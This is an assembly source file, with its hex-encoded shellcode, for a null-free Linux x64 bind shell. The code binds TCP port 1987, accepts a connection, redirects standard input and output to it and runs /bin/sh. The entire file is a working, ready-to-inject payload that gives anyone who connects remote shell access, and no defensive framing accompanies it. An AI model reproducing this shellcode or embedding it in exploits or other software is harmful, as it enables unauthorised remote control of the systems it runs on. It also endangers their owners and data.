; bind-linux-x64-shellcode.asm
; For Linux x64.
;
; Opens a remote /bin/sh on port 1987.
;
; Carlos Reventlov <carlos@reventlov.com>.
;
; Please see also bind-linux-x64.asm for commented full source code.
;
; DISCLAIMER
;
; ** No zeros were used on the making of this program. **
;
; Shellcode
; \xb2\x06\x40\xb6\x01\x40\xb7\x02\xb0\x29\x0f\x05\x48\x93\x48\x31\xc0\xb2\x10
; \x48\x31\xc9\x80\xc1\x02\x50\x66\x68\x07\xc3\x66\x51\x48\x89\xe6\x89\xdf\xb0
; \x31\x0f\x05\x48\x31\xf6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x48\x31\xf6\x89\xdf
; \xb0\x2b\x0f\x05\x48\x93\x40\xb6\x02\x48\x89\xdf\xb0\x21\x0f\x05\x40\xfe\xce
; \x79\xf4\x48\xbf\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x48\x89
; \xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05

global _start

section .text

_start:

  ; socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)
  mov dl,   0x06          ; IPPROTO_TCP
  mov sil,  0x01          ; SOCK_STREAM
  mov dil,  0x02          ; PF_INET
  mov al,   0x29          ; __NR_socket
  syscall

  xchg rbx, rax           ; edi = <sock>

  ; bind(<sock>, <address>, sizeof sockaddr_in)
  xor rax,  rax           ; rax = 0
  mov dl,   0x10          ; sizeof sockaddr_in

  xor rcx,  rcx           ; rcx = 0
  add cl,   0x02          ; rcx = 2

  push rax                ; Bind IP (0.0.0.0)
  push word 0xc307        ; Bind port (1987)
  push cx                 ; PF_INET
  mov rsi,  rsp           ; <address>

  mov edi,  ebx           ; <sock>
  mov al,   0x31          ; __NR_bind
  syscall

  ; listen(<sock>, 0)
  xor rsi,  rsi           ; rsi = 0
  mov edi,  ebx           ; <sock>
  mov al,   0x32          ; __NR_listen
  syscall

  ; accept(<sock>, 0, 0)
  xor edx,  edx           ; edx = 0
  xor rsi,  rsi           ; rsi = 0
  mov edi,  ebx           ; <sock>
  mov al,   0x2b          ; __NR_accept
  syscall

  xchg rbx, rax           ; rbx = <conn>

  mov sil,  0x02          ; rsi = 2

loop:
  mov rdi,  rbx           ; rdi = <conn>
  mov al,   0x21          ; __NR_dup2
  syscall
  dec sil                 ; rsi--
  jns loop

  ; execve("/bin/sh\0", 0, 0)
  mov rdi,  0x68732f6e69622fff ; ?/bin/sh
  shr rdi,  0x08          ; /bin/sh\0

  push rdi
  mov rdi,  rsp

  xor rsi,  rsi           ; rsi = 0
  xor rdx,  rdx           ; rdx = 0
  mov al,   0x3b          ; __NR_execve
  syscall
